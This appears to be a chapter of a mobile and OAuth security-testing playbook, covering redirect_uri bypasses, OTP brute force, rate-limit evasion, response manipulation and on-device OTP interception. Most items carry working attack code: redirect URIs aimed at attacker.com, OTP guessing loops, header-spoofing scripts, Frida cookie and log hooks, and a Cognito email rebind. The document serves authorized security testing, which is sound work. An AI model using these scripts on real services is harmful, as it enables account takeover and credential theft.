| **VRT** | `server_security_misconfiguration.oauth_misconfiguration.insecure_redirect_uri` (VARIES); `.account_takeover` (P2) with the chain |
| **Attacker** | AM-02 |
| **Applies to** | All OAuth clients |
| **Maps to** | draft-ietf-oauth-security-topics §2.1 ("authorization servers MUST utilize exact string matching except for port numbers in `localhost`"); RFC 9700 / RFC 6819; H1 #1861974 ($2,000), #1567186 |

- **Test:** Exact matching is the only safe configuration. Anything looser — prefix match, regex, "starts with", subdomain wildcard — has produced a bypass class.
- **How:** Against registered `https://app.target.com/cb`, iterate:
```
https://attacker.app.target.com/cb          subdomain
https://app.target.com.attacker.com/cb      suffix
https://app.target.com@attacker.com/cb      userinfo
https://app.target.com/cb/../@attacker.com/ path traversal
https://app.target.com/redirect?to=https://attacker.com/   open-redirect chain
https://app.target.com/cb#@attacker.com/    fragment
targetapp://x@attacker.tld                  custom-scheme userinfo
$RURI + "/"   $RURI + "?x=1"   $RURI + "#"   different path   different scheme
```
Enumerate the registered URIs from the authorization-request error messages when the URI is malformed.
- **Proof:** The `code`/`access_token` lands at your origin **and you complete the exchange**.
- **Escalation:** Loose redirect + a co-installed app claiming the scheme (D13-031) = a malicious app that never needs to be the "chosen" handler. Per the conditionally-valid table: open redirect alone is never-submit; open redirect + OAuth `redirect_uri` → auth-code theft = Critical. Subdomain takeover + a `redirect_uri` registered at that subdomain = Critical.
- **Ruled out when:** Every variant is rejected with `invalid_request`/`redirect_uri_mismatch`. Two FP traps to apply before claiming: a **fragment-only** modification still lands the code at the legitimate origin, because browsers ignore everything after `#` when navigating — report it only with a follow-on chain; and browsers strip fragments on 302 redirects to a new origin, so an open-redirect chain does not carry a fragment-delivered token.

### D13-033 · `state` binding, authorization-code reuse and mix-up defence

| | |
|---|---|
| **Severity ceiling** | Critical (attacker's IdP account bound to the victim's app account = permanent SSO access) |
| **VRT** | `server_security_misconfiguration.oauth_misconfiguration.missing_state_parameter` (VARIES); `.account_takeover` (P2) |
| **Attacker** | AM-02 |
| **Applies to** | Any OAuth/OIDC integration |
| **Maps to** | draft-ietf-oauth-security-topics §2.1.4 ("a defense against mix-up attacks is REQUIRED"), §4.5.3 code-injection defences; RFC 9207 (`iss` response parameter); `hunt-oauth` FP trap "State parameter exists but isn't validated" |

- **Test:** Three token-endpoint behaviours worth a single sitting. (1) `state` may be present because the IdP requires it and never validated. (2) Authorization codes may not be single-use. (3) If the app talks to more than one authorization server, is a mix-up defence present?
- **How:**
```bash
# code reuse: redeem the same code twice
for n in first second; do
  curl -s -X POST https://auth.target/oauth/token -d grant_type=authorization_code \
    -d code=$CODE -d client_id=$CID -d redirect_uri=$RURI -d code_verifier=$VER | tee $n.json
done
# state: replay the callback with a DIFFERENT state, and with none at all
# mix-up: is the `iss` response parameter present and checked?
```
- **Proof:** A second successful token response from the same code; or acceptance of a callback whose `state` does not match the one issued. For `state`, the exploit is account-link CSRF: send the victim your authorization-code redirect URL so *your* IdP account binds to *their* app account, then log in via your IdP and see their data — prove it with a D13-003 marker on the victim account.
- **Escalation:** → permanent SSO access that survives the victim's password change; → D13-037 (what else the OAuth path skips).
- **Ruled out when:** The second redemption returns `invalid_grant`, a mismatched or absent `state` is rejected at the callback, and (for multi-AS apps) the `iss` parameter is present and validated. Code reuse and `state` validation are independent — check both.

### D13-034 · OAuth in an embedded WebView instead of a Custom Tab

| | |
|---|---|
| **Severity ceiling** | Medium standalone; High where the app already injects JS into the auth page or attaches a bridge |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) only if you demonstrate credential capture yielding a session; otherwise a documented deviation |
| **Attacker** | AM-08 (the host app or an SDK inside it), AM-03 via a repackaged clone |
| **Applies to** | All. **LEGACY:** apps predating AppAuth/Custom Tabs (roughly pre-2016) do this by default |
| **Maps to** | RFC 8252: "native apps MUST NOT use embedded user-agents to perform authorization requests"; `CustomTabsIntent` documentation (the host app has no access to Custom Tab content or cookies) |

- **Test:** An embedded WebView lets the host app read the credentials the user types and the IdP's session cookies — which means a repackaged clone can, and means the legitimate app is one XSS away from the same.
- **How:**
```bash
S=jadx_out/sources
grep -rn 'loadUrl(\|WebViewClient\|shouldOverrideUrlLoading\|onPageFinished' $S | grep -iE 'oauth|authorize|login|sso|saml'
grep -rn 'CustomTabsIntent\|androidx.browser.customtabs\|AppAuth\|net.openid.appauth' $S
```
If `CustomTabsIntent` is present, the app is doing it correctly. If the authorize URL is loaded into a `WebView`, demonstrate the capability:
```js
Java.perform(function () {
  var WV = Java.use('android.webkit.WebView');
  WV.evaluateJavascript.overload('java.lang.String','android.webkit.ValueCallback')
    .implementation = function (js, cb) { console.log('[eval] ' + js); return this.evaluateJavascript(js, cb); };
  var CM = Java.use('android.webkit.CookieManager');
  console.log('[idp cookie] ' + CM.getInstance().getCookie('https://accounts.idp.example'));
});
```
- **Proof:** The authorize URL logged at `loadUrl` inside an in-process WebView, plus either injected JS reading the credential form or `CookieManager.getInstance().getCookie(idpUrl)` returning the IdP session cookie from inside the app's process.
- **Escalation:** WebView + `addJavascriptInterface` on the auth page is direct credential theft → D10 bridge → D13-010.
- **Ruled out when:** The authorize URL is handed to `CustomTabsIntent` or AppAuth and never reaches an in-process `WebView` — confirm at runtime, not only in source, because a fallback path frequently exists for devices with no Custom Tabs provider. Force that fallback (uninstall every browser that supports Custom Tabs) and re-check.

### D13-035 · The OAuth path skips a control the direct signup enforces

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where it reaches a verified-only capability; `server_security_misconfiguration.oauth_misconfiguration.account_squatting` (P4) |
| **Attacker** | AM-01 |
| **Applies to** | Apps with both direct and federated signup |
| **Maps to** | H1 #922456 ($3,000, email-verification bypass through the OAuth flow), #740989 (staff without the app permission reaching an app via OAuth misconfiguration) |

- **Test:** Compare what direct signup enforces against what the OAuth path enforces — email verification, scope/permission checks, account-state gating, terms acceptance, KYC. The bug is a check present on one path and missing on the other.
- **How:** Register and authenticate through OAuth, then attempt each capability that direct signup gates:
```bash
for ep in /v1/invite /v1/messages /v1/payouts /v1/teams/join; do
  printf '%-18s ' "$ep"
  curl -s -o /dev/null -w '[%{http_code}]\n' -X POST https://api.target$ep \
    -H "Authorization: Bearer $OAUTH_ONLY_TOKEN" -H 'Content-Type: application/json' -d '{}'
done
```
- **Proof:** The control bypassed — for example an unverified email reaching a verified-only feature, or a principal without the app permission reaching the app.
- **Escalation:** → D13-061 (pre-hijacking, which this enables) → D15.
- **Ruled out when:** Every capability gated on the direct-signup path is equally gated for the OAuth-created principal, checked endpoint by endpoint rather than by reading the UI. The UI hides the buttons; the API is where the check either exists or does not.

### D13-036 · Identity-provider self-service attribute abuse (Cognito / Firebase Auth / Auth0 class)

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Cognito / Firebase-Auth / Auth0-backed mobile apps |
| **Maps to** | H1 #1342088 (AWS Cognito API misconfiguration allowing ATO), #1679734; `hunt-ato` "Modern ATO increasingly lives in the identity layer, not the password form" |

- **Test:** The app delegates identity to a provider and misconfigures it — self-service attribute updates, unverified-email account linking, or a user-pool API reachable directly from the client. **Mobile apps ship the pool and client ids in the binary, which is exactly how you find the surface.**
- **How:**
```bash
grep -rnE 'cognito-idp|CognitoUserPool|us-[a-z]+-[0-9]_[A-Za-z0-9]+|identityPoolId|firebaseio|FirebaseApp|auth0\.com|clientId' \
  jadx_out/sources jadx_out/resources/res/values/strings.xml
# then exercise the provider surface directly
aws cognito-idp initiate-auth --client-id "$CID" --auth-flow USER_PASSWORD_AUTH \
  --auth-parameters USERNAME=$U,PASSWORD=$P --region "$REGION"
aws cognito-idp update-user-attributes --access-token "$AT" \
  --user-attributes Name=email,Value=victim@target.example
```
- **Proof:** Your credential bound to a victim's account, shown with a D13-003 marker that the victim account carries and the attacker account now returns.
- **Escalation:** → D18 (the rest of the cloud backend) → D15.
- **Ruled out when:** The pool's attribute schema marks the identity attributes immutable, `update-user-attributes` on an identity attribute is refused, and linking requires a verified email. Note that finding the pool id itself is expected and not a finding — the self-service mutation is.

### D13-037 · The OAuth claim-field substring trap

| | |
|---|---|
| **Severity ceiling** | Support |
| **VRT** | n/a — kill gate protecting an identity-provider Critical claim |
| **Attacker** | n/a |
| **Applies to** | Any automated auth-response classifier, including your own agent loops |
| **Maps to** | ENGAGEMENTS.md Engagement 02 gap #3 (`feedback_oauth_substring_trap`) → `hunt-oauth`, `m365-entra-attack` |

- **Test:** Microsoft's MFA-required (`AADSTS50076`) and Conditional-Access claims-challenge response bodies contain the literal text `access_token` **as a substring inside the claims-challenge JSON**, not as an issued token. Naive tooling reports "auth bypass succeeded".
- **How:** Always JSON-parse the response and read the actual field; never `grep`, `in`, or a regex against the raw body.
```bash
# WRONG
curl -s "$TOKEN_EP" -d "$BODY" | grep -q access_token && echo "BYPASS"
# RIGHT
curl -s "$TOKEN_EP" -d "$BODY" | jq -e '.access_token // empty' >/dev/null \
  && echo "token field present" || echo "no token field"
```
- **Proof:** The parsed token field is present **and the token authenticates** — not that the string appeared.
- **Escalation:** n/a — kill gate.
- **Ruled out when:** Not applicable. Generalise the rule: every "success" determination in this chapter is a parsed field plus a follow-on authenticated request, never a substring match.

### D13-038 · OTP verify throttling — measure the boundary, do not assume absence

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) with the issued session; `two_fa_bypass` (P3) as the floor; `server_security_misconfiguration.no_rate_limiting_on_form.login` (P4) / `insufficient_security_configurability.no_account_lockout` (P5) for the bare absence |
| **Attacker** | AM-01 |
| **Applies to** | All OTP verify endpoints — **especially mobile ones, where the limit is often enforced only client-side** |
| **Maps to** | NIST SP 800-63B §5.2.2 (limit consecutive failed attempts to no more than 100), §5.1.3.2 (OOB secrets ≥ 20 bits; rate-limit required below 64 bits; accepted once during the validity period), §5.1.4.1/§5.1.4.2; `hunt-brute-force` Pattern 1 (Critical, $8,000: 100 attempts, no 429, no lockout on `POST /api/v2/auth/verify-otp`); H1 #125505 ($5,000), #743545 |

- **Test:** A 6-digit OTP is a 10^6 keyspace; a 4-digit one is 10,000. The reportable fact is the **threshold**, not "six attempts had no 429".
- **How:**
```bash
ffuf -u "https://api.target/v1/otp/verify" -X POST \
  -H "Content-Type: application/json" -H "Cookie: session=$PRE_MFA" \
  -d '{"code":"FUZZ"}' -w <(seq -w 000000 999999) \
  -fc 400,401,429 -t 10 -mr "success|true|token"
```
Start at `-t 1` to measure, then ramp. When 429 appears, determine which key it uses — rotate `X-Forwarded-For` (per-IP), open a fresh pre-MFA session (per-session), switch account (per-account), switch username casing (per-username). **PoC discipline: 100 attempts is sufficient evidence — do not brute to 999999.** Use the Python form from D13-005 so the result count is asserted.
- **Proof:** `otp_bf.log` showing hundreds of 4xx followed by a 200 carrying a session token — that single file is the report. Or, where a limit exists, a quantified threshold with the derived time-to-exhaust: "10/min × 60 × 24 across N parallel sessions reaches 10^4 in X hours".
- **Escalation:** → D13-065 (a session was minted without the second factor) → D15 as the victim; → D23 if the OTP guards a payment.
- **Ruled out when:** A 429 or lockout appears at a threshold below NIST's 100-attempt ceiling **and** survives all four key-rotation attempts (IP header, fresh session, account, username normalisation). Report the code length: at 5–6 digits with a working throttle the attack is impractical and the finding degrades — the corpus's own researcher says so in H1 #202425.

### D13-039 · Client-only rate limit the API never enforces

| | |
|---|---|
| **Severity ceiling** | Critical (when it reaches an OTP or recovery code → ATO) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Any app whose lockout UX lives in the client — the single most mobile-specific item in the brute-force corpus |
| **Maps to** | `hunt-brute-force` pattern library, "Watch for client-only limits (mobile apps) that the API doesn't enforce" |

- **Test:** The app shows "3 attempts remaining" and locks its own UI. The server never counted. A recovery code in the corpus was brute-forceable for exactly this reason.
- **How:**
```bash
# find the counter in the client first — it tells you the number the server is NOT enforcing
grep -rnE 'attempts|retryCount|maxAttempts|remainingTries|lockUntil|MAX_OTP' jadx_out/sources | head -30
adb shell run-as com.target.app cat shared_prefs/*.xml | grep -iE 'attempt|retry|lock'
# then bypass the client entirely
python3 - <<'PY'
import requests
for i in range(1, 51):
    r = requests.post("https://api.target/v1/otp/verify",
                      json={"phone": PHONE, "otp": f"{i:04d}"}, timeout=10)
    print(i, r.status_code, len(r.content))
PY
```
- **Proof:** Attempt N+1 succeeding against the API after the app's UI would have locked out — with the client-side constant quoted from the decompiled source beside the transcript showing the server accepting attempt N+50.
- **Escalation:** → D13-038 → ATO; the same pattern applies to PIN gates (D13-082) and to login (D13-013).
- **Ruled out when:** The server returns 429 at or below the client's own displayed threshold, and resetting the client-side counter (clearing `shared_prefs`, reinstalling) does not restore attempts server-side. Clearing app data is the quick check: if the counter resets and the server still refuses, the limit is genuinely server-side.

### D13-040 · Rate-limit bypass by rotating the client-IP header

| | |
|---|---|
| **Severity ceiling** | Critical chained to OTP brute; Medium standalone |
| **VRT** | `server_security_misconfiguration.no_rate_limiting_on_form.login` (P4) standalone; `authentication_bypass` (P1) once you show the outcome the limit protected |
| **Attacker** | AM-01 |
| **Applies to** | Any IP-keyed throttle behind a proxy |
| **Maps to** | `hunt-brute-force` Pattern 4; Gowthams `rate-limit-bypass.md` (verbatim header list); `hunt-business-logic` FP trap "Rate-limit bypass framed as business logic" |

- **Test:** The limiter reads the client IP from a request header without validating it against the trusted-proxy chain. **The bypass is the primitive; the bug is the abuse case.**
- **How:** Sweep the header set, then the identifier-mutation set.
```bash
python3 - <<'PY'
import random, requests
H = ["X-Forwarded-For","X-Real-IP","X-Originating-IP","X-Remote-IP","X-Remote-Addr",
     "X-Client-IP","X-Host","X-Forwarded-Host","True-Client-IP","CF-Connecting-IP"]
for i in range(1, 201):
    ip = f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"
    hdr = {h: ip for h in H}
    r = requests.post("https://api.target/v1/otp/verify", headers=hdr,
                      json={"phone": PHONE, "otp": f"{i:04d}"}, timeout=10)
    print(i, r.status_code, len(r.content))
PY
```
Then mutate the *account identifier* itself, which frequently re-keys the counter: `%00`, `%0d%0a`, `%09`, `%0C`, `%20`, a trailing blank space in the email, and a case change.
- **Proof:** Attempt counts far exceeding the documented limit with no 429 and no lockout, then the consequence — the accepted OTP and the issued session. Filed as "business logic" without demonstrating the outcome the limit protected, this is incomplete.
- **Escalation:** + D13-038 OTP brute → ATO (Critical); + D13-013 login → credential stuffing.
- **Ruled out when:** The 429 persists across every header in the set *and* across identifier mutation, i.e. the limiter keys on something the client cannot influence (the authenticated principal, or an IP derived from the trusted-proxy chain). Record which key it uses — that detail is what makes the negative defensible.

### D13-041 · Capped verify × uncapped resend = an unbounded attempt budget

| | |
|---|---|
| **Severity ceiling** | High (unauthenticated login variant); Medium (authenticated 2FA variant on the same API) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) with the session header returned; `server_security_misconfiguration.no_rate_limiting_on_form.sms_triggering` (P4) for the resend side |
| **Attacker** | AM-01 |
| **Applies to** | All |
| **Maps to** | H1 #205000 (Grab, High 7.5), #202425 (Grab, Medium 4.3), #149598 (cited in-report as prior art) |

- **Test:** The highest-value auth bug shape in the disclosed corpus. Verification is capped at N attempts before the code expires, but **resending** is not — so the effective budget is unbounded over time.
- **How:** The disclosed arithmetic: verify allows **3 attempts** before expiry; resend has a **30-second** cooldown and no cap. That is 6 attempts/minute, 360/hour, **8,640/day** against a 4-digit (10,000-value) space — success in 24–72 hours.
```python
import itertools, time, requests
guess = itertools.cycle(range(10000))
while True:
    requests.post("https://api.target/api/passenger/v2/profiles/activationsms", json={"msisdn": TARGET})
    for _ in range(3):
        code = f"{next(guess):04d}"
        r = requests.post("https://api.target/api/passenger/v2/profiles/activate",
                          json={"profileActivationCode": code})
        print(code, r.status_code)
        if r.status_code in (200, 204):
            print("SESSION HEADERS:", dict(r.headers)); raise SystemExit
    time.sleep(30)
```
- **Proof:** A 204/200 on a code you never received, with the session header in the response. Capture the full request/response pair for **both** the failure (`{"status":400,"code":4000}`) and the success (`HTTP/1.1 204 No Content`) — the response delta is what triages.
- **Escalation:** Full ATO from a phone number alone. Always test the **login** path, not only the settings path: the same technique at the two entry points produced a 3-point severity gap in the disclosed pair.
- **Ruled out when:** Either the resend endpoint is capped per account per window, **or** a new OTP invalidates the previous one *and* the verify cap applies to the account rather than to the code instance. State the honest preconditions the way the accepted report did — "the victim will be informed that something is wrong because of few incoming SMSes" and "the process may take many hours" — and it still rated High 7.5.

### D13-042 · OTP replay: the code does not burn, and old codes survive a new request

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `insufficient_security_configurability.weak_two_fa_implementation.old_two_fa_code_is_not_invalidated_after_new_code_is_generated` (P5); `.two_fa_code_is_not_updated_after_new_code_is_requested` (P5); `two_fa_bypass` (P3) with the bypass demonstrated |
| **Attacker** | AM-01 |
| **Applies to** | TOTP/HOTP/SMS verify endpoints |
| **Maps to** | NIST SP 800-63B §5.1.4.2 (OTP accepted once during the validity period); `hunt-mfa-bypass` "OTP replay"; `security-arsenal` MFA Pattern 2 |

- **Test:** After a successful submit, the "used" flag may never be written. Separately, requesting a **new** OTP may leave every previous one valid, which multiplies the brute-force surface and turns D13-038's Medium into a Critical.
- **How:**
```bash
# a) burn test: complete MFA with C, log out, log back in within the validity window, submit C again
for n in 1 2; do
  curl -s -o /dev/null -w "submit#$n [%{http_code}]\n" -X POST https://api.target/v1/otp/verify \
    -H 'Content-Type: application/json' -d "{\"phone\":\"$PH\",\"otp\":\"$C\"}"
done
# b) supersession test: request three codes, then try the FIRST one
for i in 1 2 3; do curl -s -X POST https://api.target/v1/otp/send -d "{\"phone\":\"$PH\"}"; sleep 35; done
curl -s -X POST https://api.target/v1/otp/verify -d "{\"phone\":\"$PH\",\"otp\":\"$FIRST_CODE\"}" -i
# c) binding test: submit the code from a different device id / fresh install / different session
```
- **Proof:** A second submission succeeding and issuing a new session; or the first-issued code still accepted after two newer ones were sent. Show the three SMS timestamps beside the accepted code.
- **Escalation:** A stolen OTP becomes persistent ATO; supersession multiplies D13-038's success probability by the number of live codes.
- **Ruled out when:** The second submission of a used code returns a distinct "already used" rejection, **and** requesting a new code invalidates every prior one, **and** the code is refused when presented from a session other than the one that requested it. All three are separate server behaviours; test them separately.

### D13-043 · Race the OTP validate (non-atomic check → mark-used → issue)

| | |
|---|---|
| **Severity ceiling** | High–Critical |
| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3); `authentication_bypass` (P1) where it yields an extra session |
| **Attacker** | AM-01 |
| **Applies to** | OTP verify endpoints, and any "you may do this once" control including MFA enrolment |
| **Maps to** | `hunt-race-condition` pattern library; `hunt-mfa-bypass` "Race condition on OTP-validate"; H1 #300305 ($15,250, email-verification bypass enabling takeover), #2110030 ($3,000) |

- **Test:** The check-and-spend window lets multiple submissions of the same code succeed. This is distinct from a pure logic bug and the distinction changes the fix and the report.
- **How:** Burp Turbo Intruder with `requestsPerConnection=1` plus single-packet (last-byte) synchronisation, or the HTTP/2 single-packet attack. An asyncio/aiohttp `gather` is the weaker form and produces false negatives.
```python
# Turbo Intruder shape
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30,
                           requestsPerConnection=1, engine=Engine.THREADED)
    for i in range(30):
        engine.queue(target.req, gate='race')
    engine.openGate('race')
```
**First run 10 sequential (non-parallel) submissions.** If all ten succeed, it is a logic bug, not a race — different framing, different defences (atomic transactions, unique constraints, advisory locks). Races reproduce 1/10 or 2/100; logic bugs reproduce 1/1.
- **Proof:** Multiple submissions succeeding with the same code **and** the code failing on a later replay, proving it *was* consumed once. A ledger effect, not N×200.
- **Escalation:** Combine with D13-038 for full ATO; apply the same technique to MFA enrolment and to "link this device once" flows.
- **Ruled out when:** Exactly one submission succeeds under single-packet synchronisation across n ≥ 10 attempts, and the sequential control also yields exactly one success. Apply the D13-004 FP guard: TOTP `window=1` accepts the previous 30-second window, so two parallel submissions spanning a boundary are two independently valid codes rather than a race.

### D13-044 · OTP echoed in a response body, header or log

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-01 (response echo); AM-04 (logcat, requires `READ_LOGS` on a co-located app) |
| **Applies to** | All OTP flows |
| **Maps to** | CVE-2018-11505 (Werewolf Online, Firebase token via `D/RNFirebaseMessaging`, EDB 44776); CVE-2014-1664 (GoToMeeting logging request URLs with `authToken=`/`accessCode=`, EDB 39061); EDB 46933 |

- **Test:** Look at the `/otp/send` response body, not only `/otp/verify`. The code, a hash of it, or a `requestId` that *is* the code, all appear in the wild. Then look at logcat and the analytics sinks.
- **How:**
```bash
# response side — read the SEND response, and the headers, not just the body
curl -s -D - -X POST https://api.target/v1/otp/send -H 'Content-Type: application/json' \
  -d "{\"phone\":\"$PH\"}" | tee /tmp/send.txt
grep -inE '"(otp|code|pin|debugOtp|otpHash|requestId|reference)"\s*:' /tmp/send.txt
# log side
adb logcat -c ; # drive the flow ;
adb logcat -d --pid=$(adb shell pidof -s com.target.app) \
  | grep -inE 'otp|code|token|bearer|eyJ[A-Za-z0-9_-]{10,}|pin='
```
Frida net for non-obvious sinks:
```js
Java.perform(function () {
  var Log = Java.use('android.util.Log');
  ['d','v','i','w','e'].forEach(function (lvl) {
    Log[lvl].overload('java.lang.String','java.lang.String').implementation = function (t, m) {
      if (/otp|code|token|pin|password/i.test(m)) console.log('[Log.' + lvl + '] ' + t + ': ' + m);
      return this[lvl](t, m); };
  });
});
```
- **Proof:** The OTP value visible in the response body or header, **plus** the completed login using it. For the log variant, the logcat line containing the value plus the replay — that replay *is* the report, as in EDB 44776 where a leaked Firebase token went straight into an authenticated `PUT`.
- **Escalation:** → D20 (what else the same sink carries) → D15 as the victim.
- **Ruled out when:** The send response carries only an opaque request id that does not validate at `/verify`, and a full-flow logcat capture (with the Frida `Log` hook active, so R8-stripped call sites are not silently missed) shows no OTP or token material. State the `READ_LOGS` precondition for the log variant — Android 4.1+ restricts it, so a co-located app needs the permission or the app must be debuggable.

### D13-045 · OTP verified client-side — response manipulation

| | |
|---|---|
| **Severity ceiling** | Critical (when the server-side state actually changes); Low/informational when only the UI advances |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
| **Attacker** | AM-06/AM-07 for the tester; AM-01 in the real threat model if the server already issued a usable session |
| **Applies to** | Mobile apps and SPAs — the highest-yield mobile-specific MFA item |
| **Maps to** | H1 #2762462 (MTN Group, **Critical 9.1**, CWE "Authentication Bypass Using an Alternate Path or Channel"), #33432 (Twitter); Gowthams `response-manipulation.md`; `hunt-mfa-bypass` "Response manipulation — client-side MFA check" |

- **Test:** The client branches on a boolean in the response rather than on a server-issued credential. Flip it — and then prove the state change persisted.
- **How:** Burp Proxy response interception, or a Match-and-Replace rule.
```http
POST /mtn_otp/index/verification/ HTTP/2
ajax=1&action=verifyotp&msisdn=<VICTIM>&otp=000000
```
```json
// server said:   {"status":400,"message":"Invalid OTP","msisdn":"<VICTIM>","success":false}
// you return:    {"status":200,"message":"success","msisdn":"<VICTIM>","success":true}
```
Also try: removing the OTP field entirely, sending `null`, flipping `otprequired` / `2fa_required` / `verified` to `false` in the **request**, and changing the status line `401 → 200`.
- **Proof:** Two-part, and the second part is the finding. (1) The app enters the authenticated screen. (2) A **subsequent** API call from a clean session returns real server data — for MTN, the victim's number now listed on the attacker's profile page after a refresh, proving the state change persisted rather than being a client illusion.
- **Escalation:** → password reset to the now-linked number → full ATO; → D23 if verification gates payouts or KYC.
- **Ruled out when:** The app advances but every subsequent API call returns 401, i.e. no usable session was issued. Say so explicitly and rate it Low — this is the single most over-claimed item in the domain. The corpus's caveat is the important part: real impact requires that the subsequent calls succeed, and often the server had already issued a usable session at the *password* step, which is itself the bug.

### D13-046 · OTP not bound to the requesting device, session or user id

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) where user A's code validates for user B |
| **Attacker** | AM-01, AM-05 |
| **Applies to** | All OTP flows |
| **Maps to** | NIST SP 800-63B §5.1.3.2 (OOB secrets bound to the authentication session); API1:2023 |

- **Test:** Three bindings the server should enforce and frequently does not: the code is tied to the requesting **device/session**, to the **user id** in the request, and to the **channel** it was sent on.
- **How:**
```bash
# 1. request on device A, verify from a fresh install / different device id / different session
curl -s -X POST https://api.target/v1/otp/verify -H "X-Device-Id: totally-different" \
  -H 'Content-Type: application/json' -d "{\"phone\":\"$PH\",\"otp\":\"$C\"}" -i
# 2. cross-user: request the code for YOUR number, submit it against the VICTIM's identifier
curl -s -X POST https://api.target/v1/otp/verify \
  -d "{\"phone\":\"$VICTIM_PH\",\"otp\":\"$MY_CODE\"}" -i
# 3. channel confusion: request by SMS, verify on the email endpoint (and vice versa)
```
- **Proof:** A session issued for the victim's identifier using a code delivered to yours; or a code accepted from a session that never requested it. Mark the victim account per D13-003 and show the marker in the resulting `/me`.
- **Escalation:** The cross-user variant is a direct P1 — it means the OTP is a global token, not a per-principal one. → D15.
- **Ruled out when:** The code is refused from any session other than the requesting one, refused against any identifier other than the one it was minted for, and refused on a different channel's verify endpoint. Test the cross-user case with two real accounts; it is the one that pays and the one a single-account engagement cannot reach.

### D13-047 · OTP request side: SMS flooding and cost abuse

| | |
|---|---|
| **Severity ceiling** | Medium; High where the endpoint accepts arbitrary numbers with no account relationship |
| **VRT** | `server_security_misconfiguration.no_rate_limiting_on_form.sms_triggering` (P4); `.email_triggering` (P4) |
| **Attacker** | AM-01 |
| **Applies to** | All OTP / magic-link flows |
| **Maps to** | API4:2023 Unrestricted Resource Consumption ("Successful attacks can lead to Denial of Service or an increase of operational costs") |

- **Test:** `/otp/send` is a separate control surface from `/otp/verify`. Unlimited requests mean the attacker bills the vendor for SMS and harasses arbitrary numbers **from the vendor's own sender id**.
- **How:** Use only a number you control, and stop at proof.
```bash
for i in $(seq 1 50); do
  curl -s -o /dev/null -w "%{http_code} " -X POST https://api.target/v1/otp/send \
    -H 'Content-Type: application/json' -d "{\"phone\":\"$MY_OWN_NUMBER\"}"
done; echo
```
- **Proof:** N HTTP 200s and N SMS actually received on your own handset — screen-record the message list showing N messages inside the window, alongside the transcript. Delivery count, not response count, is the evidence.
- **Escalation:** Some implementations issue a *new* OTP per request but keep the old ones valid — that is D13-042's supersession failure and it converts this Medium into the Critical at D13-041.
- **Ruled out when:** The endpoint enforces a per-number and per-account cooldown and cap (and a global cap for unauthenticated senders), and requests for a number with no account relationship are refused. This is a cost-inflicting test: keep volumes low, use only your own number, and note the stop point in the report.

### D13-048 · The four on-device OTP interception channels, tested as a set

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.two_fa_bypass` (P3) as the floor; `authentication_bypass` (P1) with the completed login |
| **Attacker** | AM-03 (implicit broadcast, accessibility, clipboard), AM-04 (`RECEIVE_SMS`, notification-listener grant) |
| **Applies to** | All |
| **Maps to** | MASWE-0037 (notifications), MASWE-0030 (clipboard), MASWE-0040 (accessibility); MASTG-TEST-0005, MASTG-TEST-0010, MASTG-TEST-0315; ATT&CK T1636.004, T1517, T1644, T1582, T1453; CVE-2025-10184 (permission-less SMS read via provider `update()` SQLi); CVE-2026-26123 (Microsoft Authenticator sign-in code in an unclaimed `ms-msa://` deeplink) |

- **Test:** An OTP that protects login can be read by any of four independent principals. Test **all four against the same app**, not one, because the fix for each is different and the severities differ by attacker model.
- **How:**
```bash
# 1. notification text
adb shell cmd notification allow_listener com.poc.attacker/.Listener
adb shell dumpsys notification --noredact | grep -iE 'android.title|android.text' | head -40
grep -rnE '\.set(ContentText|ContentTitle|SubText|Ticker)\(' jadx_out/sources -B6 \
  | grep -inE 'password|passcode|pin|secret|otp|token|auth(entication)?code'
# 2. SMS: permission path and injected broadcast (see D13-049)
aapt2 dump permissions base.apk | grep -E 'RECEIVE_SMS|READ_SMS'
adb shell content query --uri content://sms/inbox --projection "address:body" | head
# 3. clipboard
grep -rnE 'setPrimaryClip|ClipData\.newPlainText|EXTRA_IS_SENSITIVE' jadx_out/sources
adb shell dumpsys clipboard 2>/dev/null
# 4. accessibility readability of the OTP field
adb shell uiautomator dump /sdcard/otp.xml && adb pull /sdcard/otp.xml && grep -i 'text=' otp.xml
```
- **Proof:** The OTP value appearing in `dumpsys notification --noredact`, in a `uiautomator` dump of the entry screen, in the clipboard, or delivered to an unprivileged receiver — **and then the completed login on a second device using that value**. Capturing the code is half a report.
- **Escalation:** → D05 (broadcast), D20 (clipboard/logging), D24 (push). Direct Reply abuse deserves its own check: does any of the client's notifications expose a `RemoteInput` action that performs a sensitive operation?
- **Ruled out when:** Notification text carries no code and uses `setVisibility(VISIBILITY_SECRET)` with a redacted `setPublicVersion`; the app uses the SMS Retriever API with no SMS permission; the clipboard is never written with the code (or is written with `EXTRA_IS_SENSITIVE`); and the OTP field is `android:importantForAccessibility="no"` or a password-type input. State the precondition for each channel you do report — the notification path needs a user grant, whereas the injected-broadcast path (D13-049) needs **no** grant at all, and the severity should reflect that difference.

### D13-049 · SMS User Consent receiver registered without `SmsRetriever.SEND_PERMISSION`

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) for the injected OTP; `broken_access_control.exposed_sensitive_android_intent` (VARIES) for the consent-intent launch |
| **Attacker** | AM-03 |
| **Applies to** | Any app using the SMS User Consent API — extremely common in fintech onboarding and card 3DS |
